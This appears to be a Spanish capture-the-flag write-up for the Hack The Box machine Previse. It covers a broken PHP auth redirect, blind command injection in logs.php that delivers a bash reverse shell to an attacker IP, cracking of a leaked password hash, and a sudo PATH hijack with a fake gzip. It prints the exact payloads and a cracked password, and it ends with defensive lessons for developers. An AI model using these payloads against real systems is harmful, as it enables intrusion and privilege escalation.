---
title: "HTB: Previse · de un redirect de PHP roto a root vía inyección de comandos"
date: 2026-09-11
draft: false
tags: ["hackthebox", "linux", "web", "escalada-privilegios", "inyeccion-comandos", "control-acceso-roto"]
summary: "Una máquina Linux retirada de dificultad fácil construida enteramente sobre un mal hábito de PHP: falta un exit() tras un redirect de login, lo que permite crear una cuenta sin autenticación; el código fuente recuperado de un backup expuesto revela una inyección de comandos de manual, y un script de sudo que llama a gzip sin ruta absoluta entrega el root."
---

## Resumen

Previse es una máquina Linux retirada de dificultad fácil de Hack The Box, y cada paso se remonta a la misma causa raíz: código PHP que asume que un redirect detiene la ejecución, cuando no es así. El camino es:

1. Una **comprobación de autenticación rota** en `accounts.php` permite crear una cuenta mediante POST sin estar autenticado.
2. Iniciar sesión expone un **backup del sitio** descargable que contiene todo el código fuente PHP.
3. Leer ese código revela una **inyección de comandos** de manual en una función de procesado de logs, dando una shell como `www-data`.
4. Las credenciales de base de datos del código fuente llevan a un hash de contraseña crackeable de un usuario real del sistema.
5. Un **script de sudo con un binario sin ruta absoluta** (`gzip` en vez de `/bin/gzip`) permite un secuestro de PATH directo a root.

Objetivo: `10.129.95.185`, un servidor Ubuntu con una pequeña aplicación PHP interna de gestión de ficheros llamada Previse.

## Enumeración

Escaneo completo de puertos TCP con scripts por defecto y detección de versiones:

```bash
nmap -sC -sV -p- -oN nmap-previse.txt 10.129.95.185
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Solo dos puertos, y el 80 redirige directo a `login.php`, con título "Previse Login". Sin SMB anónimo, sin servicios exóticos, todo el reto vive en la aplicación web. `gobuster` mapea la app:

```bash
gobuster dir -u http://10.129.95.185 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```
/accounts.php  (Status: 302) [--> login.php]
/config.php    (Status: 200)
/download.php  (Status: 302) [--> login.php]
/files.php     (Status: 302) [--> login.php]
/file_logs.php (Status: 302) [--> login.php]
/index.php     (Status: 302) [--> login.php]
/logout.php    (Status: 302) [--> login.php]
/logs.php      (Status: 302) [--> login.php]
/status.php    (Status: 302) [--> login.php]
```

Todo protegido por autenticación, como se espera, salvo `config.php`, que responde 200 vacío (normal en un include de servidor sin salida HTML). Por ahora parece un callejón sin salida sin credenciales.

## Punto de entrada · un `exit()` que falta

Probar los mismos endpoints a mano, en vez de fiarse solo del escáner, saca a la luz una inconsistencia: una petición `curl` simple, sin cookie, a `accounts.php` no se comporta como la de gobuster.

```bash
curl -s http://10.129.95.185/accounts.php
```

Esto devuelve un 200 completo: el formulario "Add New Account", con la advertencia *"ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!"* incluida. Dos peticiones GET sin autenticar a la misma URL, dos resultados distintos. Eso no es normal, merece tratarse como una pista y no como casualidad.

Capturando el POST del formulario de creación de cuenta y reenviándolo por Burp Repeater, sin ninguna cookie de sesión, lo confirma: mandar `username`, `password` y `confirm` devuelve **"Success! User was added!"**. La lógica de creación de cuenta se ejecuta independientemente de si hay sesión iniciada.

La causa resulta ser un bug de una sola línea, visible más tarde con el código fuente en la mano:

```php
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
}
// la ejecución sigue aquí de todos modos
```

`header()` solo encola un redirect, no detiene el script. Sin un `exit;` justo después, todo lo que viene a continuación se sigue ejecutando para un visitante sin autenticar. Un navegador sigue el redirect y nunca llega a renderizar el resto de la página, por eso el bug pasó desapercibido en uso normal, y por eso la petición GET de `gobuster` mostraba un 302 limpio: un GET sin datos de formulario simplemente cae en un resultado vacío. Solo aflora al mandar el POST real.

Con la cuenta nueva, iniciar sesión en `login.php` da una sesión real. `files.php` (roto de la misma forma, por cierto, aunque ya no hace falta) ya había dejado ver un `siteBackup.zip` accesible por `download.php?file=32`. Ahora descargable con sesión válida:

```bash
curl -s -b "PHPSESSID=<sesion>" "http://10.129.95.185/download.php?file=32" -o siteBackup.zip
unzip siteBackup.zip -d siteBackup
```

El zip contiene todo el árbol de código fuente PHP de la aplicación.

## Del código fuente a una shell

`config.php` entrega las credenciales de la base de datos en texto plano:

```php
$user = 'root';
$passwd = 'mySQL_p@ssw0rd!:)';
```

Pero el fichero más interesante es `logs.php`, detrás de la función "Log Data" (el formulario de `file_logs.php` deja elegir un delimitador de log: coma, espacio o tabulación):

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
...
ob_clean();
readfile($filepath);
```

`$_POST['delim']` se concatena directamente en un comando de shell sin validar ni escapar nada. Esto es **inyección de comandos**: cualquier metacarácter de shell en `delim` (`;`, `&&`, `|`, comillas invertidas) rompe el argumento previsto y ejecuta un segundo comando. Curiosamente, el `echo $output` nunca llega a la respuesta, `ob_clean()` vacía el buffer de salida justo antes de que el script sirva el fichero de log, así que es una inyección **ciega**, el comando se ejecuta pero su salida es invisible por HTTP. No hay problema, una reverse shell no necesita imprimir nada de vuelta:

```bash
curl -s -b "PHPSESSID=<sesion>" \
  --data-urlencode "delim=comma; bash -c 'bash -i >& /dev/tcp/10.10.14.55/4444 0>&1'" \
  http://10.129.95.185/logs.php
```

```
$ nc -lvnp 4444
connect to [10.10.14.55] from (UNKNOWN) [10.129.95.185] 59404
www-data@previse:/var/www/html$
```

Shell como `www-data` confirmada.

## Escalada de privilegios · de credenciales de base de datos a secuestro de PATH

La credencial root de MySQL de `config.php` funciona localmente, y la tabla `accounts` da más de sí que las cuentas creadas durante el punto de entrada:

```sql
select * from accounts;
```

```
| username | password                            |
|----------|-------------------------------------|
| m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.   |
```

Es un hash MD5crypt (`$1$sal$hash`, modo 500 de hashcat), y sí, la sal contiene literalmente un emoji, no es un artefacto de renderizado, está horneado dentro del propio hash. A hashcat le da igual, procesa los bytes en crudo sin importar cómo se rendericen:

```bash
hashcat -m 500 -a 0 m4lwhere.hash /usr/share/wordlists/rockyou.txt
# $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

`m4lwhere` resulta ser una cuenta real del sistema, accesible directamente por el puerto SSH que estaba abierto desde el principio:

```bash
ssh m4lwhere@10.129.95.185
cat user.txt
```

Flag de usuario capturada. Comprobar los permisos de sudo revela una única entrada, muy acotada:

```bash
sudo -l
# (root) /opt/scripts/access_backup.sh
```

```bash
cat /opt/scripts/access_backup.sh
```

```bash
#!/bin/bash
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

El script llama a `gzip` por nombre, no por ruta completa (`/bin/gzip`). Ejecutado como root vía `sudo`, sigue buscando en el `$PATH` del usuario que lo invoca, y esta configuración de sudoers no lo resetea (`secure_path` no está puesto). Basta con meter un `gzip` falso antes en el `$PATH` para que root ejecute el nuestro:

```bash
mkdir /dev/shm/hijack
cat << 'EOF' > /dev/shm/hijack/gzip
#!/bin/bash
bash -p -i > /dev/tty 2>&1 < /dev/tty
EOF
chmod +x /dev/shm/hijack/gzip
export PATH=/dev/shm/hijack:$PATH
sudo /opt/scripts/access_backup.sh
```

(La redirección explícita a `/dev/tty` importa, el propio `>` del script hacia un fichero `.gz` se tragaría si no la salida de la shell obtenida.)

```
root@previse:~# cat /root/root.txt
ad645ed8************************89
```

Flag de root capturada. Compromiso total.

## Lecciones

Cada paso aquí es una variación del mismo tema: código que confía en sus propias suposiciones más de lo que debería.

- **`header('Location: ...')` no es `exit`.** PHP sigue ejecutando después de encolar un redirect. Cualquier comprobación de autenticación construida así necesita un `exit;` explícito justo después, o es puramente decorativa.
- **Nunca construyas un comando de shell con entrada de usuario sin sanear.** `escapeshellarg()`, una lista blanca de valores válidos, o evitar `exec()`/`shell_exec()` directamente habrían cerrado esto; concatenar cadenas en un comando de shell es casi siempre una vulnerabilidad.
- **Un backup descargable es una fuga de código fuente.** Una vez que el código sale, cada credencial y cada fallo de lógica dentro de él sale también. Los backups necesitan el mismo control de acceso que la aplicación, si no más.
- **Las entradas de `sudo` deberían llamar a los binarios por ruta absoluta**, y sudoers debería fijar `secure_path`. Un nombre de binario relativo dentro de un script con privilegios es una invitación permanente a un secuestro de `$PATH`.

*Los flags están parcialmente ocultos, por convención.*
